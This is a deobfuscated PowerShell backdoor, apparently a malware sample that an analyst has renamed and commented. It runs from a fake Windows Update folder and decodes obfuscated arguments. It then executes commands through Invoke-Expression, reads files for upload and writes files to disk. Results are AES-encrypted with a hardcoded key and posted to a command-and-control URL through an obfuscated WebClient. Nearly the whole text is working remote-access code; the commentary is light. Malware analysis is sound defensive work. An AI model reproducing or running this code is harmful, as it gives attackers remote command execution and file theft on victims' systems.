#Net.WebClient to be used to connect to C2 at the end of the script
$t = "t"
$lien = "`l`ien"
$WebC = "`WebC"
$Net_ = "`Net`."

#Return byte array as a string converted to UTF8
function x64_Decode_UTF8 {
	param([system.byte[]]$bb
	)
	#some really not good obfuscation technique
	$tf8_getS = 'tf8.getS'
	$em_Text_en = 'em.Text.en'
	$command_to_Run = 'param([System.byt' + 'e[]]$qq); return ([Syst' + $em_Text_en + 'coding]::u' + $tf8_getS + 'tring($qq))'
	#make a powershell instance and use it to execute 'param([System.byte[]]$qq); return ([System.Text.encoding]::utf7,getString($qq))'
	$PS_Instance_to_run = [powershell]::Create()
	#Send output to nothing
	$PS_Instance_to_run.addScript($command_to_Run) | out-null
	#add the arg from before, and be quiet about it, the out-null is just to suppress output from the script being ran.
	$PS_Instance_to_run.AddArgument($bb) | out-null
	#return what happens when you run the param thing, really this just returns a byte array of UTF8 for the string.  $qq is the byte array created, and
	#And that'command_to_Run it!
	return ($PS_Instance_to_run.Invoke())

}
#return String converted to UTF8
function gb {
	param([string]$ss)
	$qq = 'f8.Ge'
	$gg = 'g]$qq); return ([Syste'
	#Do the same flippin' thing as before
	#param([string]$qq);return ([System.Text.encoding]::utf8.GetBytes($qq))
	$command_to_Run = 'param([strin' + $gg + 'm.Text.encoding]::ut' + $qq + 'tBytes($qq))'
	$PS_Instance_to_run = [powershell]::Create()
	$PS_Instance_to_run.addScript($command_to_Run) | out-null
	$PS_Instance_to_run.AddArgument($ss) | out-null
	return ($PS_Instance_to_run.invoke())
}

$fake_Windows_Update_Path = "C:\Users\$env:username\AppData\Local\Microsoft\Windows\Update\"
cd $fake_Windows_Update_Path
#Replaces all '-' with 'H' and replace all '@' with 'a' then return the decoded x64 value as UTF8 byte array. Does this to obfuscate the x64
function weirdx64Convert {
	param (
		[parameter(Mandatory = $true)]
		[System.String]$return_string
	)
	return x64_Decode_UTF8 -bb ([System.Convert]::FromBase64String($return_string.Replace('-', 'H').Replace('@', 'a')))
}

$generic_string_List = New-Object System.Collections.Generic.List[string]
#don't know what's in this ID.txt file, but will find out. 
$ID_txt_file_Content = Get-Content ($fake_Windows_Update_Path + "ID.txt")
$generic_string_List += $ID_txt_file_Content[1] 
$superfluous_txt_file_to_remove_after_creating_for_no_reason = 'PS_Instance_to_run.txt'
$empty_string_01 = ''
$args_if_args_not_RES = ''
#if args equals res, then res then empt_string_01 equals an empty UTF8 byte array.
if ($args[0].Substring(0, 6) -eq 'RES!#%') {
	$dsf = $args[0].Substring(6, $args[0].Length - 6)
	$empty_string_01 = x64_Decode_UTF8 -bb ([System.Convert]::FromBase64String($dsf))
}
#Otherwise, if the arg is not 'RES!#%' then you will return the value of the x64 byte array found as an argument as a byte array
else {
	$args_if_args_not_RES = x64_Decode_UTF8 -bb ([System.Convert]::FromBase64String($args[0]))
}

# delete the dummy text file
Remove-Item $superfluous_txt_file_to_remove_after_creating_for_no_reason
#Create the encryption key you'll use to send data to the C2 with the worst mode of encryption possible even though they could've just not used a dumb mode of enc just as easily.
#But hey, we're working with partial data here, so they might have a good reason
$Key_enc_Obj = New-Object System.Security.Cryptography.AesManaged
$Key_enc_Obj.Mode = [System.Security.Cryptography.CipherMode]::CBC
$Key_enc_Obj.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$Key_enc_Obj.BlockSize = 128
$Key_enc_Obj.KeySize = 256
[byte[]]$enc_key = 23, 29, 132, 232, 65, 174, 228, 192, 255, 251, 162, 124, 134, 209, 236, 130, 184, 128, 124, 184, 195, 121, 154, 17, 184, 250, 45, 183, 120, 31, 209, 90
[byte[]]$IV = 24, 60, 237, 111, 179, 52, 159, 154, 198, 249, 8, 249, 41, 222, 53, 82 
$Encryptolator = $Key_enc_Obj.CreateEncryptor($enc_key, $IV)
$Decryptolator = $Key_enc_Obj.CreateDecryptor($enc_key, $IV)
#set etpEWQ to !@#EWQ
$etpEWQ = (weirdx64Convert('IUAjRVdR'))
$C2_Destination = 'http://127.0.0.1/get'
#If the args aren't equal to ':' then do what you are going to do. And continue with your options. No matter input, this will execute
if ($args_if_args_not_RES -ne (weirdx64Convert('Og=='))) {
 #  If the x64 input from args starts with 'RES!#%'
	if ($empty_string_01.Length -eq 0) {
		#args_if_args_not_RES could be Anything, but String3 becomes an array of arguments
		$argument_array = $args_if_args_not_RES -split $etpEWQ, 0, "SimpleMatch"
		$Argument_01 = $argument_array[0]
		$Argument_02 = $argument_array[1]
		#Get rid of all error sin the list, this is important because later we use errors to execute something
		$Error.Clear()
		if ($Argument_01 -eq '0') {

			$Argument_03 = $argument_array[2]
			# Run the argument_03 command
			$Run_Argument_03 = Invoke-Expression($Argument_03)
			#Get the output of the command ran and separate by basically putting an ending quotation, then a carriage return so the next thing should start with a quotation mark
			$String_08 = ($Run_Argument_03 -join """`r`n""")
			#Change the empty string 1 so it is now the 2nd arg plus the !@#EWQ plus the now quoted text 
			$empty_string_01 = $Argument_02 + $etpEWQ + $String_08
			
		}
		elseif ($Argument_01 -eq '1') {
			
			$Path = $argument_array[2]
			#read the arg2 file
			$file_bytes = [System.IO.File]::ReadAllBytes($Path)
			# Convert it to x64
			$base64_variable = [System.Convert]::ToBase64String($file_bytes)
			# Catenate it to the end of the string
			$empty_string_01 = $Argument_02 + $etpEWQ + $base64_variable
		}
		elseif ($Argument_01 -eq '2') {
			$Path = $argument_array[2]
			#get the 4th argument
			$4th_arg = $argument_array[3]
			#Get the 4th argument's text converted from x64
			$4th_arg_text = [System.Convert]::FromBase64String($4th_arg)
			#Write the 4th args text to file
			[System.IO.File]::WriteAllBytes($Path, $4th_arg_text)
			#The weird x64 convert says "Error Occurred" with a carriage return at the end. Will always be "False"
			if ($Error.Length -gt 0) { $empty_string_01 = $Argument_02 + $etpEWQ + (weirdx64Convert('RXJyb3IgT2NjdXJyZWQ=')) }
			#empty string =arg02 + !@#ETPWFile Copied Successfully\n 
			else { $empty_string_01 = $Argument_02 + $etpEWQ + (weirdx64Convert('RmlsZSBDb3BpZWQgU3VjY2VzZnVsb-k=')) }
			
		}
	}
	#Because of the error clear this is just catenating !@#EWQ to the Empt_string_01
	$empty_string_01_E = gb -ss ($empty_string_01 + $etpEWQ + ($Error -join """`r`n"""))
	$Encrypted_Empty_String_01_E = $Encryptolator.TransformFinalBlock($empty_string_01_E, 0, $empty_string_01_E.Length)
	
	$WebClientObject = New-Object System.$Net_$WebC$lien$t
	#Add User agent to the header plus Generic_String_List's first element which could be something like application/urlencoded or whatever
	$WebClientObject.Headers.Add((weirdx64Convert('VXNlckFnZW50')), $generic_string_List[0])
	#Post the String to the C2Destination.
	$C2_Dest_Response = $WebClientObject.UploadData($C2_Destination, $Encrypted_Empty_String_01_E)
	#Decrypt the C2 Server Response. Not bothering to 
	$C2_Server_Response_Decrypted = $Decryptolator.TransformFinalBlock($C2_Dest_Response, 0, $C2_Dest_Response.Length)
	# Decode the response
	$C2_Server_Response_Decoded = x64_Decode_UTF8 -bb $C2_Server_Response_Decrypted
	
}

